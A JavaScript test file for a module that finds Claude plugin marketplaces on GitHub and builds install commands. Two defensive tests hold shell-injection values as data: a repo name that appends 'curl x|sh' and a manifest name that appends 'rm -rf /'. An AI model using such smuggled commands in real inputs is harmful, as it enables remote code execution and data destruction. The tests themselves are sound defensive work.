import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as github from '../src/sources/github.js';

const NOW = '2026-06-25T00:00:00Z';

const CODE_SEARCH = {
  items: [
    { repository: { full_name: 'Owner/Repo' }, path: '.claude-plugin/marketplace.json' },
    { repository: { full_name: 'Owner/Repo' }, path: '.claude-plugin/marketplace.json' }, // dup
    { repository: { full_name: 'a/b' }, path: '.claude-plugin/marketplace.json' },
    { path: 'no-repo.json' } // malformed, skipped
  ]
};
const MANIFEST = { name: 'cool-mp', plugins: [{ name: 'sec-audit', description: 'Audit security' }] };

test('source name is "github"', () => {
  assert.equal(github.name, 'github');
});

test('parseCodeSearch dedupes repos and skips malformed items', () => {
  const repos = github.parseCodeSearch(CODE_SEARCH);
  assert.deepEqual(repos.map((r) => r.fullName), ['Owner/Repo', 'a/b']);
  assert.deepEqual(repos[0], { owner: 'Owner', repo: 'Repo', fullName: 'Owner/Repo', path: '.claude-plugin/marketplace.json' });
});

test('rawManifestUrl builds a HEAD raw URL', () => {
  assert.equal(
    github.rawManifestUrl({ fullName: 'Owner/Repo', path: '.claude-plugin/marketplace.json' }),
    'https://raw.githubusercontent.com/Owner/Repo/HEAD/.claude-plugin/marketplace.json'
  );
});

test('collect fetches search + manifests and emits candidate plugin caps', async () => {
  const fetchJson = async (url) => {
    if (url.includes('/search/code')) return CODE_SEARCH;
    if (url.includes('raw.githubusercontent.com/Owner/Repo')) return MANIFEST;
    return null; // a/b has no manifest -> skipped
  };
  const res = await github.collect({ fetchJson, now: NOW, githubToken: null });
  assert.equal(res.ok, true);
  assert.equal(res.capabilities.length, 1);
  const c = res.capabilities[0];
  assert.equal(c.kind, 'plugin');
  assert.equal(c.name, 'sec-audit');
  assert.equal(c.source.discoveredVia, 'github');
  assert.equal(c.source.repo, 'github:owner/repo');
  assert.equal(c.install.method, 'plugin');
  assert.equal(c.install.command, 'claude plugin marketplace add Owner/Repo && claude plugin install sec-audit@cool-mp');
});

test('collect returns ok:false when the search call fails', async () => {
  const res = await github.collect({ fetchJson: async () => null, now: NOW, githubToken: null });
  assert.equal(res.ok, false);
  assert.deepEqual(res.capabilities, []);
});

test('parseCodeSearch dedupes case-insensitively', () => {
  const json = { items: [
    { repository: { full_name: 'Owner/Repo' }, path: '.claude-plugin/marketplace.json' },
    { repository: { full_name: 'owner/repo' }, path: '.claude-plugin/marketplace.json' }
  ] };
  assert.equal(github.parseCodeSearch(json).length, 1);
});

test('collect skips repos whose full_name is unsafe (shell-injection defense)', async () => {
  const CS = { items: [{ repository: { full_name: 'evil/repo && curl x|sh' }, path: '.claude-plugin/marketplace.json' }] };
  const fetchJson = async (url) => url.includes('/search/code') ? CS : { name: 'm', plugins: [{ name: 'p' }] };
  const res = await github.collect({ fetchJson, now: 't', githubToken: null });
  assert.deepEqual(res.capabilities, []);            // unsafe repo skipped before any command is built
});

test('collect falls back to a safe marketplace name when manifest.name is unsafe', async () => {
  const CS = { items: [{ repository: { full_name: 'Owner/Repo' }, path: '.claude-plugin/marketplace.json' }] };
  const MANIFEST = { name: 'evil && rm -rf /', plugins: [{ name: 'sec' }] };
  const fetchJson = async (url) => url.includes('/search/code') ? CS : MANIFEST;
  const res = await github.collect({ fetchJson, now: 't', githubToken: null });
  assert.equal(res.capabilities.length, 1);
  // unsafe manifest name dropped -> fallback "Owner-Repo"; no stray shell metacharacters from the name
  assert.equal(res.capabilities[0].install.command, 'claude plugin marketplace add Owner/Repo && claude plugin install sec@Owner-Repo');
});
